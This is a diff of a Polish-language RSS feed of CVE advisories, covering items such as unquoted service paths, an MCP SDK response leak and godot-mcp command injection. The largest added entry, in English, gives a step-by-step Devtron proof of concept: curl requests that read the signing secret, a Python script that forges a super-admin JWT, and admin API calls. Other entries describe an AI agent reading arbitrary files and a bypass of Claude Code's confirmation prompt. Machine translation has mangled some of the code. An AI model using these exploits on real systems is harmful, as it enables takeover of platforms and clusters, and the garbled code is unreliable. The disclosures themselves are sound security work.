@@ -1,5 +1,7 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2023-43637</title><link>https://nvd.nist.gov/vuln/detail/CVE-2023-43637</link><pubDate>Wed, 04 Feb 2026 23:21:25 +0000</pubDate><description>### Wpływ
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-1898</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1898</link><pubDate>Thu, 05 Feb 2026 00:32:09 +0000</pubDate><description>W WeKan do wersji 8.20 została stwierdzona podatność.Dotyczy to nieznanej części pliku packages/wekan-ldap/server/syncUser.js komponentu LDAP User Sync.Ta manipulacja powoduje niewłaściwą kontrolę dostępu.Istnieje możliwość zdalnego zainicjowania ataku.Aktualizacja do wersji 8.21 może złagodzić ten problem.Nazwa poprawki: 146905a459106b5d00b4f09453a6554255e6965a.Należy zaktualizować komponent, którego dotyczy problem.
+
+CVSS Score: 6.3 (medium)</description></item><item><title>CVE-2019-25267</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25267</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Wing FTP Server 6.0.7 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu z podwyższonymi uprawnieniami systemowymi.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną w konfiguracji usługi w celu wstrzyknięcia złośliwych plików wykonywalnych, które zostaną uruchomione z uprawnieniami systemu lokalnego.</description></item><item><title>CVE-2019-25271</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25271</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>NETGATE Data Backup 3.0.620 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w konfiguracji usługi NGDatBckpSrv Windows.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę do wstrzyknięcia i wykonania złośliwego kodu z uprawnieniami LocalSystem, umieszczając pliki wykonywalne w określonych lokalizacjach katalogów.</description></item><item><title>CVE-2019-25275</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25275</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>BartVPN 1.2.2 zawiera niecytowaną lukę w ścieżce usługi w BartVPNService, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu z podwyższonymi uprawnieniami systemowymi.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną, umieszczając złośliwe pliki wykonywalne w określonych lokalizacjach systemu plików w celu przejęcia kontekstu wykonywania usługi.</description></item><item><title>CVE-2019-25276</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25276</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Studio 5000 Logix Designer 30.01.00 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze aktywacji FactoryTalk, która umożliwia użytkownikom lokalnym potencjalne wykonanie kodu z podwyższonymi uprawnieniami.Atakujący mogą wykorzystać niecytowaną ścieżkę w C:\Program Files (x86)\Rockwell Software\FactoryTalk Activation\, aby wstrzyknąć złośliwy kod, który mógłby zostać wykonany z uprawnieniami LocalSystem.</description></item><item><title>CVE-2019-25272</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25272</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>TexasSoft CyberPlanet 6.4.131 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze CCSrvProxy, która umożliwia lokalnym atakującym wykonanie dowolnego kodu.Atakujący mogą wykorzystać niecytowaną ścieżkę w „C:\Program Files (x86)\TenaxSoft\CyberPlanet\SrvProxy.exe”, aby wstrzyknąć złośliwe pliki wykonywalne i uzyskać podwyższone uprawnienia systemowe.</description></item><item><title>CVE-2019-25288</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25288</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Wacom WTabletService 6.6.7-3 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi, która umożliwia lokalnym atakującym wykonanie złośliwego kodu z podwyższonymi uprawnieniami.Osoby atakujące mogą wstawić plik wykonywalny do ścieżki usługi, aby uruchomić nieautoryzowany kod po ponownym uruchomieniu usługi lub ponownym uruchomieniu systemu.</description></item><item><title>CVE-2019-25281</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25281</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>Klient NCP Secure Entry 9.2 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w wielu usługach systemu Windows, która umożliwia lokalnym użytkownikom potencjalne wykonanie dowolnego kodu.Osoby atakujące mogą wykorzystać niecytowane ścieżki w usługach takich jak ncprwsnt, rwsrsu, ncpclcfg i NcpSec w celu wstrzyknięcia złośliwego kodu, który będzie wykonywany z uprawnieniami LocalSystem podczas uruchamiania usługi.</description></item><item><title>CVE-2019-25274</title><link>https://nvd.nist.gov/vuln/detail/CVE-2019-25274</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>ProShow Producer 9.0.3797 zawiera niecytowaną lukę w zabezpieczeniach ścieżki usługi w usłudze ScsiAccess, która umożliwia lokalnym atakującym potencjalne wykonanie dowolnego kodu.Osoby atakujące mogą wykorzystać niecytowaną ścieżkę binarną do wstrzyknięcia złośliwych plików wykonywalnych, które będą uruchamiane z uprawnieniami systemu lokalnego podczas uruchamiania usługi.</description></item><item><title>CVE-2026-1896</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1896</link><pubDate>Thu, 05 Feb 2026 00:31:01 +0000</pubDate><description>W WeKan do wersji 8.20 została odkryta podatność.Podatnością dotknięta jest funkcja ComprehensiveBoardMigration w serwerze plików/migrations/comprehensiveBoardMigration.js w komponencie Migration Operation Handler.Manipulowanie argumentem boardId prowadzi do nieprawidłowej kontroli dostępu.Atak jest możliwy do przeprowadzenia zdalnie.Aktualizacja do wersji 8.21 rozwiązuje ten problem.Identyfikator poprawki to cc35dafef57ef6e44a514a523f9a8d891e74ad8f.Zalecana jest aktualizacja komponentu, którego dotyczy problem.</description></item><item><title>CVE-2023-43637</title><link>https://nvd.nist.gov/vuln/detail/CVE-2023-43637</link><pubDate>Wed, 04 Feb 2026 23:21:25 +0000</pubDate><description>### Wpływ
 
 Funkcja pochodnejVaultKey wywołuje funkcję retrieveCloudKey, która zawsze zwraca wartość „foobarfoobarfoobarfoobarfoobarfo”.Po połączeniu z losowo wygenerowanym 32-bajtowym kluczem za pomocą mergeKeys (16 bajtów z każdego), ostatnie 16 bajtów to zawsze „arfoobarfoobarfo”.Dzięki temu osoba atakująca posiadająca fizyczny dostęp do urządzenia z systemem EVE-OS może podjąć próbę złamania pozostałych 128 bitów klucza metodą brute-force.
 
@@ -130,7 +132,531 @@ Proces lokalny na tej samej maszynie może wykonywać dowolne polecenia jako uż
 
 Uaktualnij do wersji poprawionej.Jeśli projektów nie można zaktualizować natychmiast, ustaw `gateway.auth` i unikaj niestandardowych wartości `cliPath`.</description></item><item><title>CVE-2026-25505</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25505</link><pubDate>Wed, 04 Feb 2026 20:06:30 +0000</pubDate><description>Bambuddy to samodzielny system archiwizacji wydruków i zarządzania dla drukarek 3D Bambu Lab.Przed wersją 0.1.7 zakodowany na stałe tajny klucz używany do podpisywania tokenów JWT jest wpisywany do kodu źródłowego, a trasy ManyAPI nie sprawdzają uwierzytelnienia.Ten problem został naprawiony w wersji 0.1.7.
 
-CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2026-25475</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25475</link><pubDate>Wed, 04 Feb 2026 19:02:51 +0000</pubDate><description>### Podsumowanie
+CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2026-25536</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25536</link><pubDate>Wed, 04 Feb 2026 20:04:16 +0000</pubDate><description>### Podsumowanie
+
+Wyciek danych odpowiedzi między klientami, gdy pojedynczy `McpServer`/`Server` i instancja transportu są ponownie wykorzystywane w wielu połączeniach klienckich, najczęściej w bezstanowych wdrożeniach `StreamableHTTPServerTransport`.
+
+### Wpływ
+
+**Kogo dotyczy problem:** Każde wdrożenie serwera MCP przy użyciu zestawu SDK TypeScript, w którym pojedyncza instancja `McpServer` (lub `Server`) jest współdzielona przez wiele jednoczesnych połączeń klientów.Dzieje się tak najprawdopodobniej w trybie bezstanowym (bez „sessionIdGenerator”), gdzie naturalnym, ale niepoprawnym wzorcem jest utworzenie jednego serwera oraz przesyłanie i obsługa przez niego wszystkich żądań.Tryb stanowy ma również wpływ, jeśli instancja serwera jest nieprawidłowo udostępniana między sesjami, chociaż ta błędna konfiguracja jest mniej powszechna, ponieważ wzorzec stanowy w naturalny sposób zachęca do instancji w ramach sesji.
+
+**Co się dzieje:** Gdy dwóch lub więcej klientów MCP wysyła żądania jednocześnie za pośrednictwem udostępnionej instancji serwera, kolizje identyfikatorów komunikatów JSON-RPC powodują kierowanie odpowiedzi do połączenia HTTP niewłaściwego klienta.Klient A może otrzymać dane odpowiedzi przeznaczone dla Klienta B i odwrotnie, nawet jeśli na każdym indywidualnym żądaniu autoryzacja została prawidłowo wymuszona.
+
+Klient pakietu MCP SDK generuje identyfikatory komunikatów za pomocą prostego licznika zwiększającego się, zaczynając od 0. Gdy dwóch klientów łączy się z tą samą instancją serwera, generują identyczne identyfikatory komunikatów, co powoduje, że wewnętrzne mapowanie żądania do strumienia transportu powoduje zastąpienie wpisu jednego klienta wpisem innego — routing odpowiedzi na niewłaściwe połączenie HTTP.
+
+**Warunki eksploatacji:**
+- Serwer ponownie wykorzystuje pojedynczą instancję `McpServer`/`Server` w żądaniach lub sesjach (zamiast tworzyć nowe instancje na żądanie/sesję)
+- Dwóch lub więcej klientów łączy się jednocześnie
+- Klienci generują nakładające się identyfikatory komunikatów JSON-RPC (praktycznie gwarantowane, ponieważ klient SDK używa licznika rosnącego zaczynającego się od 0)
+
+**Nie dotyczy:**
+- Serwery stanowe, które tworzą nowy transport `McpServer` + na sesję (typowy i zalecany wzorzec stanu)
+- Serwery bezstanowe, które tworzą nowy transport `McpServer` + na żądanie
+- Środowiska z jednym klientem (np. rozwój lokalny z jednym IDE)
+
+### Poprawki
+
+Poprawka dodaje zabezpieczenia środowiska wykonawczego, które zamieniają ciche błędne przekierowanie danych w natychmiastowe, możliwe do podjęcia błędy:
+
+1. Funkcja „Protocol.connect()” zgłasza teraz, czy protokół jest już podłączony do transportu, zapobiegając cichemu nadpisaniu transportu zarówno w trybie stanowym, jak i bezstanowym
+2. Bezstanowa metoda `StreamableHTTPServerTransport.handleRequest()` zgłasza teraz, jeśli zostanie wywołana więcej niż raz, wymuszając jedno żądanie na transport w trybie bezstanowym
+
+Serwery, które nieprawidłowo ponownie wykorzystywały instancje, otrzymają teraz wyraźny komunikat o błędzie nakazujący im utworzenie oddzielnych instancji dla każdego połączenia.
+
+### Obejścia
+
+Jeśli projektów nie można natychmiast zaktualizować, upewnij się, że serwer tworzy świeże instancje `McpServer` i transportu dla każdego żądania (bezstanowe) lub sesji (stanowe):
+
+```maszynopis
+// Tryb bezstanowy: utwórz nowy serwer + transport na żądanie
+app.post('/mcp', async (req, res) =&gt; {
+const serwer = nowy McpServer({nazwa: 'mój-serwer', wersja: '1.0.0' });
+// ... zarejestruj narzędzia, zasoby itp.
+const transport = new StreamableHTTPServerTransport({ sessionIdGenerator: niezdefiniowany });
+czekaj na serwer.połącz(transport);
+czekaj na transport.handleRequest(req, res);
+});
+
+// Tryb stanowy: utwórz nowy serwer + transport na sesję
+const sesje = nowa mapa();
+app.post('/mcp', async (req, res) =&gt; {
+const sessionId = req.headers['mcp-session-id'];
+if (sessions.has(sessionId)) {
+czekaj na sesje.get(sessionId).transport.handleRequest(req, res);
+} jeszcze {
+const serwer = nowy McpServer({nazwa: 'mój-serwer', wersja: '1.0.0' });
+// ... zarejestruj narzędzia, zasoby itp.
+stały transport = nowy StreamableHTTPServerTransport({
+sessionIdGenerator: () =&gt; losowyUUID()
+});
+czekaj na serwer.połącz(transport);
+sesje.set(transport.sessionId, {serwer, transport });
+czekaj na transport.handleRequest(req, res);
+}
+});
+```
+
+### Zasoby
+
+- https://github.com/modelcontextprotocol/typescript-sdk/issues/204
+- https://github.com/modelcontextprotocol/typescript-sdk/issues/243</description></item><item><title>CVE-2026-25546</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25546</link><pubDate>Wed, 04 Feb 2026 20:02:32 +0000</pubDate><description>### Wpływ
+Luka w zabezpieczeniach typu Command Injection w godot-mcp umożliwia zdalne wykonanie kodu.Funkcja `executeOperation` przekazała dane wejściowe kontrolowane przez użytkownika (np. `projectPath`) bezpośrednio do `exec()`, która uruchamia powłokę.Osoba atakująca może wstrzyknąć metaznaki powłoki, takie jak `$(polecenie)` lub `&amp;calc`, aby wykonać dowolne polecenia z uprawnieniami procesu serwera MCP.
+
+Ma to wpływ na każde narzędzie, które akceptuje `projectPath`, w tym `create_scene`, `add_node`, `load_sprite` i inne.
+
+### Poprawki
+Naprawiono w wersji 0.1.1 przełączając z `exec()` na `execFile()`, które nie wywołuje powłoki.
+
+### Obejścia
+Żadne.Użytkownicy powinni natychmiast dokonać aktualizacji.
+
+### Zasoby
+- https://github.com/Coding-Solo/godot-mcp/issues/64
+- https://github.com/Coding-Solo/godot-mcp/pull/67</description></item><item><title>CVE-2026-25538</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25538</link><pubDate>Wed, 04 Feb 2026 19:46:10 +0000</pubDate><description># Devtron Attributes API Unauthorized Access Leading to API Token Signing Key Leakage
+
+## Summary
+
+This vulnerability exists in Devtron's Attributes API interface, allowing any authenticated user (including low-privileged CI/CD Developers) to obtain the global API Token signing key by accessing the `/orchestrator/attributes?key=apiTokenSecret` endpoint. After obtaining the key, attackers can forge JWT tokens for arbitrary user identities offline, thereby gaining complete control over the Devtron platform and laterally moving to the underlying Kubernetes cluster.
+
+**CWE Classification**: CWE-862 (Missing Authorization)
+
+## Details
+
+### Vulnerability Mechanism
+
+Devtron uses a JWT-based API Token mechanism for authentication. All API Tokens are signed using HMAC-SHA256 with the `apiTokenSecret` stored in the database. This key is exposed through the Attributes API, but the authorization check code for this API has been commented out, allowing any authenticated user to read it.
+
+### Source Code Analysis
+
+**Vulnerability Location**: `api/restHandler/AttributesRestHandlder.go:173-195`
+
+```go
+func (handler AttributesRestHandlerImpl) GetAttributesByKey(w http.ResponseWriter, r *http.Request) {
+    // Only checks if user is logged in
+    userId, err := handler.userService.GetLoggedInUser(r)
+    if userId == 0 || err != nil {
+        common.HandleUnauthorized(w, r)
+        return
+    }
+
+    // CRITICAL: RBAC check is commented out
+    /*token := r.Header.Get("token")
+    if ok := handler.enforcer.Enforce(token, rbac.ResourceGlobal, rbac.ActionGet, "*"); !ok {
+        WriteJsonResp(w, errors.New("unauthorized"), nil, http.StatusForbidden)
+        return
+    }*/
+
+    // Directly retrieves any attribute without authorization
+    vars := mux.Vars(r)
+    key := vars["key"]
+    res, err := handler.attributesService.GetByKey(key)
+    if err != nil {
+        handler.logger.Errorw("service err, GetAttributesById", "err", err)
+        common.WriteJsonResp(w, err, nil, http.StatusInternalServerError)
+        return
+    }
+    common.WriteJsonResp(w, nil, res, http.StatusOK)
+}
+```
+
+**Key Usage**: `pkg/apiToken/ApiTokenSecretService.go:54-88`
+
+```go
+func (impl ApiTokenSecretServiceImpl) GetApiTokenSecretByteArr() ([]byte, error) {
+    if len(impl.apiTokenSecretStore.Secret) == 0 {
+        return nil, errors.New("secret found empty")
+    }
+    return []byte(impl.apiTokenSecretStore.Secret), nil
+}
+
+func (impl ApiTokenSecretServiceImpl) getApiSecretFromDb() (string, error) {
+    apiTokenSecret, err := impl.attributesService.GetByKey(bean.API_SECRET_KEY)
+    if err != nil {
+        return "", err
+    }
+    if apiTokenSecret == nil || len(apiTokenSecret.Value) == 0 {
+        return "", errors.New("api token secret from DB found nil/empty")
+    }
+    return apiTokenSecret.Value, nil
+}
+```
+
+This key is used to sign and verify all Devtron API Tokens and is the core credential of the control plane.
+
+## PoC (Proof of Concept)
+
+### Environment Setup
+
+#### Prerequisites
+
+- Kubernetes cluster (v1.22+)
+- kubectl configured
+- Helm 3.x
+- Python 3.x with PyJWT library
+
+#### Step 1: Install Devtron
+
+```bash
+# Add Devtron Helm repository
+helm repo add devtron https://helm.devtron.ai
+helm repo update devtron
+
+# Install Devtron with CI/CD module
+helm install devtron devtron/devtron-operator \
+  --create-namespace --namespace devtroncd \
+  --set components.devtron.service.type=NodePort \
+  --set installer.modules={cicd} \
+  --set installer.arch=multi-arch
+
+# Wait for installation to complete (15-20 minutes)
+kubectl -n devtroncd get installers installer-devtron -o jsonpath='{.status.sync.status}'
+# Expected output: Applied
+```
+
+#### Step 2: Access Devtron Dashboard
+
+```bash
+# Set up port forwarding
+kubectl -n devtroncd port-forward service/devtron-service 8000:80 &amp;
+
+# Get admin password
+ADMIN_PASSWORD=$(kubectl -n devtroncd get secret devtron-secret \
+  -o jsonpath='{.data.ADMIN_PASSWORD}' | base64 -d)
+echo "Admin password: ${ADMIN_PASSWORD}"
+```
+
+Access http://127.0.0.1:8000 and login with admin account.
+
+### Exploitation Steps
+
+#### Step 1: Obtain User Token
+
+Login as a regular user and obtain token:
+
+```bash
+# Login as regular user
+curl -s -X POST "http://127.0.0.1:8000/orchestrator/api/v1/session" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"'${ADMIN_PASSWORD}'"}' | jq .
+
+# Extract token
+USER_TOKEN=$(curl -s -X POST "http://127.0.0.1:8000/orchestrator/api/v1/session" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"'${ADMIN_PASSWORD}'"}' | jq -r '.result.token')
+
+echo "User token: ${USER_TOKEN:0:50}..."
+```
+
+**Actual Output Example**:
+```json
+{
+  "code": 200,
+  "status": "OK",
+  "result": {
+    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+    "userId": 1,
+    "userEmail": "admin"
+  }
+}
+```
+
+#### Step 2: Exploit Vulnerability to Retrieve apiTokenSecret
+
+Use the obtained token to access the unauthorized Attributes API:
+
+```bash
+# Request apiTokenSecret
+curl -s -X GET "http://127.0.0.1:8000/orchestrator/attributes?key=apiTokenSecret" \
+  -H "token: ${USER_TOKEN}" | jq .
+
+# Extract secret
+API_SECRET=$(curl -s -X GET "http://127.0.0.1:8000/orchestrator/attributes?key=apiTokenSecret" \
+  -H "token: ${USER_TOKEN}" | jq -r '.result.value')
+
+echo "Leaked API Token Secret: ${API_SECRET:0:20}..."
+echo "Secret length: ${#API_SECRET} characters"
+```
+
+**Actual Output Example**:
+```json
+{
+  "code": 200,
+  "status": "OK",
+  "result": {
+    "id": 1,
+    "key": "apiTokenSecret",
+    "value": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+    "active": true,
+    "createdOn": "2024-01-15T10:30:00Z",
+    "createdBy": 1
+  }
+}
+```
+
+#### Step 3: Forge Admin JWT Token
+
+Forge admin token using the leaked key:
+
+```bash
+# Install PyJWT if not already installed
+pip3 install PyJWT
+
+# Create token forging script
+cat &gt; forge_token.py &lt;&lt; 'EOF'
+#!/usr/bin/env python3
+import jwt
+import time
+import sys
+import json
+
+def forge_admin_token(secret, user_id=1, email="admin"):
+    exp_time = int(time.time()) + 365 * 24 * 60 * 60
+
+    payload = {
+        "sub": str(user_id),
+        "email": email,
+        "iat": int(time.time()),
+        "exp": exp_time,
+        "iss": "devtron",
+        "roles": ["role:super-admin___"]
+    }
+
+    token = jwt.encode(payload, secret, algorithm="HS256")
+    return token
+
+if __name__ == "__main__":
+    if len(sys.argv) &lt; 2:
+        print("Usage: python forge_token.py &lt;apiTokenSecret&gt;")
+        sys.exit(1)
+
+    secret = sys.argv[1]
+    admin_token = forge_admin_token(secret, user_id=1, email="admin")
+    print(f"[+] Forged Admin Token:")
+    print(admin_token)
+    print()
+
+    decoded = jwt.decode(admin_token, secret, algorithms=["HS256"])
+    print(f"[+] Token Payload:")
+    print(json.dumps(decoded, indent=2))
+EOF
+
+chmod +x forge_token.py
+
+# Forge admin token
+python3 forge_token.py "${API_SECRET}"
+```
+
+**Actual Output Example**:
+```
+[+] Forged Admin Token:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZW1haWwiOiJhZG1pbiIsImlhdCI6MTcwNTMxNDAwMCwiZXhwIjoxNzM2ODUwMDAwLCJpc3MiOiJkZXZ0cm9uIiwicm9sZXMiOlsicm9sZTpzdXBlci1hZG1pbl9fXyJdfQ.xYz123AbC456DeF789GhI012JkL345MnO678PqR901StU
+
+[+] Token Payload:
+{
+  "sub": "1",
+  "email": "admin",
+  "iat": 1705314000,
+  "exp": 1736850000,
+  "iss": "devtron",
+  "roles": [
+    "role:super-admin___"
+  ]
+}
+```
+
+#### Step 4: Test Forged Token with Admin APIs
+
+Use the forged token to access admin APIs:
+
+```bash
+# Extract forged token
+FORGED_TOKEN=$(python3 forge_token.py "${API_SECRET}" | grep -A 1 "Forged Admin Token:" | tail -1)
+
+# Test 1: Get all users (requires admin permission)
+echo "[*] Test 1: Getting user list..."
+curl -s -X GET "http://127.0.0.1:8000/orchestrator/user/all" \
+  -H "token: ${FORGED_TOKEN}" | jq '.result[] | {id, email_id, roles}'
+
+# Test 2: Get cluster list (requires admin permission)
+echo "[*] Test 2: Getting cluster list..."
+curl -s -X GET "http://127.0.0.1:8000/orchestrator/cluster" \
+  -H "token: ${FORGED_TOKEN}" | jq '.result[] | {id, cluster_name, server_url}'
+
+# Test 3: Get all applications
+echo "[*] Test 3: Getting application list..."
+curl -s -X GET "http://127.0.0.1:8000/orchestrator/app/list" \
+  -H "token: ${FORGED_TOKEN}" | jq '.result'
+```
+
+**Actual Output Example**:
+```
+[*] Test 1: Getting user list...
+{
+  "id": 1,
+  "email_id": "admin",
+  "roles": ["role:super-admin___"]
+}
+{
+  "id": 2,
+  "email_id": "developer@example.com",
+  "roles": ["role:developer"]
+}
+
+[*] Test 2: Getting cluster list...
+{
+  "id": 1,
+  "cluster_name": "default_cluster",
+  "server_url": "https://kubernetes.default.svc"
+}
+
+[*] Test 3: Getting application list...
+{
+  "appContainers": [
+    {
+      "appId": 1,
+      "appName": "sample-app",
+      "projectId": 1
+    }
+  ]
+}
+```
+
+### Expected Result
+
+If the vulnerability exists, it should be able to:
+
+1. Successfully obtain `apiTokenSecret` using any authenticated user's token
+2. Successfully forge JWT tokens using the leaked key
+3. Successfully access admin-only APIs using the forged token
+4. Retrieve sensitive information such as user lists, cluster configurations, etc.
+
+## Impact
+
+### Security Impact
+
+**Confidentiality**: Severe impact. Attackers can:
+- Obtain the global API Token signing key
+- Read all user information and permission configurations
+- Access Kubernetes cluster configurations and credentials
+- Read sensitive application configurations and Secrets
+
+**Integrity**: Severe impact. Attackers can:
+- Forge API Tokens for arbitrary user identities
+- Modify application configurations and deployments
+- Create or delete CI/CD pipelines
+- Modify user permissions and roles
+
+**Availability**: High impact. Attackers can:
+- Delete critical applications and configurations
+- Disrupt CI/CD processes
+- Modify cluster configurations causing service interruptions
+
+### Business Impact
+
+1. **Complete Control of Devtron Platform**: Attackers gain privileges equivalent to super administrators
+2. **Lateral Movement to Kubernetes Cluster**: Cluster credentials obtained through Devtron can directly control the underlying Kubernetes
+3. **Supply Chain Attacks**: Can modify CI/CD pipelines to inject malicious code
+4. **Data Breach**: Can access all application configurations and Secrets
+5. **Cloud Environment Penetration**: In cloud environments, can further obtain IAM credentials
+
+### Attack Scenarios
+
+**Scenario 1: Insider Threat**
+- Low-privileged developer exploits this vulnerability to escalate privileges
+- Gains full access to production environment
+- Steals sensitive data or plants backdoors
+
+**Scenario 2: Supply Chain Attack**
+- Attacker obtains low-privileged account through social engineering
+- Exploits vulnerability to gain admin privileges
+- Modifies CI/CD pipelines to inject malicious code
+- Affects all applications using the pipeline
+
+**Scenario 3: Lateral Movement**
+- Attacker has already compromised a low-privileged account
+- Exploits this vulnerability to gain Kubernetes cluster access
+- Deploys cryptocurrency miners or other malicious payloads in the cluster
+
+## Severity
+
+**CVSS v3.1 Score**: 9.8 (Critical)
+
+**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+
+**Score Breakdown**:
+- **Attack Vector (AV:N)**: Network accessible, exploited via HTTP API
+- **Attack Complexity (AC:L)**: Low complexity, requires only one HTTP request
+- **Privileges Required (PR:L)**: Requires low privileges (any authenticated user)
+- **User Interaction (UI:N)**: No user interaction required
+- **Scope (S:C)**: Scope changed, can affect resources beyond Devtron (Kubernetes cluster)
+- **Confidentiality (C:H)**: High impact, can read all sensitive information
+- **Integrity (I:H)**: High impact, can modify all configurations and data
+- **Availability (A:H)**: High impact, can delete resources and disrupt services
+
+**Severity Level**: Critical
+
+## Affected Versions
+
+- Devtron: All versions (as of 2026-01-26 verification)
+- Specifically affected code files:
+  - `api/restHandler/AttributesRestHandlder.go`
+  - `pkg/apiToken/ApiTokenSecretService.go`
+
+
+## Workarounds
+
+Before an official patch is released, the following temporary measures can be taken:
+
+### Option 1: Network-Level Restrictions
+
+```bash
+# Use NetworkPolicy to restrict access to Devtron API
+kubectl apply -f - &lt;&lt;EOF
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: devtron-api-restriction
+  namespace: devtroncd
+spec:
+  podSelector:
+    matchLabels:
+      app: devtron
+  policyTypes:
+  - Ingress
+  ingress:
+  - from:
+    - podSelector:
+        matchLabels:
+          role: admin
+    ports:
+    - protocol: TCP
+      port: 8080
+EOF
+```
+
+### Option 2: Rotate API Token Secret
+
+```bash
+# Generate new secret
+NEW_SECRET=$(openssl rand -hex 32)
+
+# Update in database
+kubectl exec -n devtroncd postgresql-postgresql-0 -- \
+  psql -U postgres -d orchestrator -c \
+  "UPDATE attributes SET value='${NEW_SECRET}' WHERE key='apiTokenSecret';"
+
+# Restart Devtron service
+kubectl rollout restart deployment/devtron -n devtroncd
+```
+
+### Option 3: Add API Gateway Filtering
+
+Deploy an API Gateway in front of Devtron to filter sensitive requests to `/orchestrator/attributes`.
+
+
+## Credits
+@b0b0haha (603571786@qq.com)
+@lixingquzhi(mayedoushidalao@163.com)</description></item><item><title>CVE-2026-25475</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25475</link><pubDate>Wed, 04 Feb 2026 19:02:51 +0000</pubDate><description>### Podsumowanie
 Funkcja `isValidMedia()` w `src/media/parse.ts` umożliwia dowolne ścieżki plików, w tym ścieżki bezwzględne, ścieżki do katalogów domowych i sekwencje przechodzenia do katalogów.Agent może odczytać dowolny plik w systemie, wypisując `MEDIA:/ścieżka/do/pliku`, wydobywając poufne dane do użytkownika/kanału.
 
 ### Szczegóły
@@ -748,7 +1274,65 @@ Zostało to załatane w wersji qwik-city 1.19.0.Zdecydowanie zachęca się użyt
 
 CVSS Score: 6.3 (medium)</description></item><item><title>CVE-2025-65079</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-65079</link><pubDate>Tue, 03 Feb 2026 20:23:24 +0000</pubDate><description>W interpreterze Postscript w różnych urządzeniach Lexmarka wykryto lukę w zabezpieczeniach związaną z przepełnieniem bufora sterty.Osoba atakująca może wykorzystać tę lukę do wykonania dowolnego kodu jako nieuprzywilejowany użytkownik.</description></item><item><title>CVE-2026-1801</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-1801</link><pubDate>Tue, 03 Feb 2026 20:12:21 +0000</pubDate><description>W libsoup, bibliotece klient/serwer HTTP, wykryto błąd.Ta luka w zabezpieczeniach związana z przemytem żądań HTTP wynika z niezgodnej ze specyfikacją RFC analizy składniowej w logice zupy_filter_input_stream_read_line(), w której libsoup akceptuje zniekształcone nagłówki fragmentów, takie jak znaki nowego wiersza (LF) zamiast wymaganego powrotu karetki i nowego wiersza (CRLF).Osoba atakująca zdalnie może to wykorzystać bez uwierzytelniania lub interakcji użytkownika, wysyłając specjalnie spreparowane, fragmentaryczne żądania.Umożliwia to libsoup analizowanie i przetwarzanie wielu żądań HTTP z pojedynczej wiadomości sieciowej, co może prowadzić do ujawnienia informacji.
 
-CVSS Score: 5.3 (medium)</description></item><item><title>CVE-2026-24887</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-24887</link><pubDate>Tue, 03 Feb 2026 19:33:32 +0000</pubDate><description>Z powodu błędu w analizie poleceń możliwe było ominięcie monitu o potwierdzenie kodu Claude'a, aby uruchomić wykonanie niezaufanych poleceń za pomocą polecenia find.Niezawodne wykorzystanie tego wymagało możliwości dodania niezaufanej zawartości do okna kontekstowego Claude Code.
+CVSS Score: 5.3 (medium)</description></item><item><title>CVE-2026-25547</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-25547</link><pubDate>Tue, 03 Feb 2026 19:41:15 +0000</pubDate><description>### Podsumowanie
+
+`@isaacs/brace-expansion` jest podatne na atak typu Denial of Service (DoS) spowodowany nieograniczonym rozszerzaniem zakresu nawiasów klamrowych.Gdy osoba atakująca dostarcza wzorzec zawierający powtarzające się zakresy nawiasów liczbowych, biblioteka chętnie próbuje synchronicznie wygenerować każdą możliwą kombinację.Ponieważ ekspansja rośnie wykładniczo, nawet niewielka ilość danych wejściowych może zużywać nadmierną ilość procesora i pamięci oraz może spowodować awarię procesu Node.js.
+
+### Szczegóły
+
